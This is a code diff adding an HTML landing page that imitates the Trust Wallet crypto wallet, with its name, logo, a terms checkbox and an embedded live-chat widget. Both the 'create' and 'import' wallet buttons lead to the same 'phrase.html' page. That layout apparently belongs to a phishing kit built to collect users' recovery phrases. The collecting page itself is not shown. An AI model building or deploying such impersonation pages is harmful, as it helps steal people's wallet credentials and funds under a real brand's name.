@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Trust Wallet</title>
+    <link rel="icon" href="32179889.png" type="image/x-icon" />
+    <style>
+      body {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+        font-family: Arial, sans-serif;
+        background-color: white;
+        color: black;
+      }
+
+      .container {
+        background-color: rgb(226, 226, 226);
+        padding: 40px;
+        border-radius: 15px;
+        text-align: center;
+        box-shadow: 0 4px 12px rgb(226, 226, 226);
+        max-width: 400px;
+        width: 100%;
+      }
+
+      h1 {
+        font-size: 2rem;
+        margin-bottom: 25px;
+      }
+
+      p {
+        font-size: 1rem;
+        margin-bottom: 10px;
+        color: black;
+      }
+
+      .logo img {
+        width: 200px;
+        height: auto;
+        margin-bottom: 10px;
+      }
+
+      .checkbox-container {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-bottom: 30px;
+      }
+
+      /* Custom checkbox styles */
+      .checkbox-container input[type="checkbox"] {
+        display: none;
+      }
+
+      .checkbox-container label {
+        position: relative;
+        padding-left: 35px;
+        cursor: pointer;
+        font-size: 1rem;
+        color: black;
+      }
+
+      .checkbox-container label::before {
+        content: "";
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 20px;
+        height: 20px;
+        border: 2px solid #007bff;
+        background-color: transparent;
+        border-radius: 4px;
+        transition: 0.3s ease;
+      }
+
+      /* Style for when checkbox is checked */
+      .checkbox-container input[type="checkbox"]:checked + label::before {
+        background-color: #007bff;
+        border-color: #007bff;
+      }
+
+      .checkbox-container input[type="checkbox"]:checked + label::after {
+        content: "✔";
+        position: absolute;
+        left: 4px;
+        top: -2px;
+        color: white;
+        font-size: 16px;
+      }
+
+      button {
+        font-size: 1rem;
+        border-radius: 25px;
+        padding: 12px 20px;
+        width: 100%;
+        cursor: pointer;
+        border: none;
+        margin-top: 15px;
+      }
+
+      .create-button {
+        background-color: blue;
+        color: white;
+      }
+
+      .create-button:hover {
+        background-color: rgb(26, 26, 188);
+      }
+
+      .import-button {
+        border: 2px solid blue;
+        color: #007bff;
+        background-color: transparent;
+      }
+
+      .import-button:hover {
+        background-color: rgb(26, 26, 188);
+        color: white;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>Welcome to Trust Wallet</h1>
+      <p>
+        Unlock the power of your cryptocurrency assets and explore the world of
+        Web3 with Trust Wallet.
+      </p>
+      <div class="logo">
+        <img src="32179889.png" alt="Trust Wallet Logo" />
+      </div>
+      <div class="checkbox-container">
+        <input type="checkbox" id="agree" />
+        <label for="agree"
+          >I agree to Trust Wallet's
+          <a href="#" style="color: #007bff">Terms of Use</a></label
+        >
+      </div>
+
+      <a href="phrase.html"
+        ><button class="create-button">Create a New Wallet</button></a
+      >
+
+      <a href="phrase.html"
+        ><button class="import-button">Import an Existing Wallet</button></a
+      >
+    </div>
+    <!-- Start of LiveChat (www.livechat.com) code -->
+    <script type="text/javascript">
+      var Tawk_API = Tawk_API || {},
+        Tawk_LoadStart = new Date();
+      (function () {
+        var s1 = document.createElement("script"),
+          s0 = document.getElementsByTagName("script")[0];
+        s1.async = true;
+        s1.src = "https://embed.tawk.to/66a2a258becc2fed692b2b32/1i3lkkb6g";
+        s1.charset = "UTF-8";
+        s1.setAttribute("crossorigin", "*");
+        s0.parentNode.insertBefore(s1, s0);
+      })();
+    </script>
+    <noscript>
+      <a href="https://www.livechat.com/chat-with/18929835/" rel="nofollow">
+        Chat with us </a
+      >, powered by
+      <a
+        href="https://www.livechat.com/?welcome"
+        rel="noopener nofollow"
+        target="_blank"
+      >
+        LiveChat
+      </a>
+    </noscript>
+    <!-- End of LiveChat code -->
+  </body>
+</html>
